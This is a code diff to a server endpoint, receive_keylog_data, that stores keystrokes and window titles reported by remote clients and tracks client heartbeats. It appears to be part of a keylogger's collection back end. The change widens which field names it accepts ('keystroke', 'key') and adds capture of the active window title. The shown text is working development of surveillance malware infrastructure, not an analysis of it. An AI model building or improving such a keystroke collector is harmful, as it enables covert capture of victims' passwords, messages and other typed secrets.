@@ -504,8 +504,11 @@ def receive_keylog_data():
                 for log in logs:
                     db.store_keylog(
                         client_id, 
-                        log.get('keys', ''),
-                        {"timestamp": log.get('timestamp'), "app": log.get('app', 'Unknown')}
+                        log.get('keystroke', log.get('key', '')),  # Support both 'keystroke' and 'keys'
+                        {
+                            "timestamp": log.get('timestamp'), 
+                            "window_title": log.get('window', log.get('app', 'Unknown'))
+                        }
                     )
                 db.update_client_heartbeat(client_id)
                 total_stored = len(db.get_keylogs(client_id, limit=1000))
